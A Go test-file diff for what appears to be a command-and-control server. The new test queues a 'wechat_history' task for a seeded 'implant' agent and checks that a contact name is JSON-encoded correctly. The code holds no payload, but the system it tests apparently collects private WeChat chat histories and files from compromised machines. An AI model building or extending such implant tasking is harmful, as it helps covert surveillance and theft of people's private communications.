@@ -2,6 +2,7 @@ package server
 
 import (
 	"bytes"
+	"encoding/json"
 	"net/http"
 	"net/http/httptest"
 	"strings"
@@ -79,6 +80,42 @@ func TestHandleFileHuntJSON(t *testing.T) {
 	}
 	if !strings.Contains(stored.Path, "Users") {
 		t.Fatalf("path=%q", stored.Path)
+	}
+}
+
+func TestHandleWeChatHistoryEncodesContactJSON(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+	s := newTestFileServer(t, testutil.SetupTestDB(t))
+	agent := seedImplant(t, s.db)
+
+	body := bytes.NewBufferString(`{"contact":"Zhang \"san\" \\ test"}`)
+	w := httptest.NewRecorder()
+	c, _ := gin.CreateTestContext(w)
+	req, _ := http.NewRequest(http.MethodPost, "/agents/"+agent.ID+"/wechat_history", body)
+	req.Header.Set("Content-Type", "application/json")
+	c.Request = req
+	c.Params = gin.Params{{Key: "id", Value: agent.ID}}
+	c.Set("user_role", "operator")
+	s.handleWeChatHistory(c)
+	if w.Code != http.StatusOK {
+		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
+	}
+	var stored db.Task
+	if err := s.db.Where("agent_id = ? AND type = ?", agent.ID, "wechat_history").First(&stored).Error; err != nil {
+		t.Fatalf("task: %v", err)
+	}
+	var decoded struct {
+		Filter  string `json:"filter"`
+		Contact string `json:"contact"`
+	}
+	if err := json.Unmarshal([]byte(stored.Command), &decoded); err != nil {
+		t.Fatalf("command is not valid JSON %q: %v", stored.Command, err)
+	}
+	if decoded.Contact != `Zhang "san" \ test` {
+		t.Fatalf("contact=%q", decoded.Contact)
+	}
+	if decoded.Filter != decoded.Contact {
+		t.Fatalf("filter=%q contact=%q", decoded.Filter, decoded.Contact)
 	}
 }
 
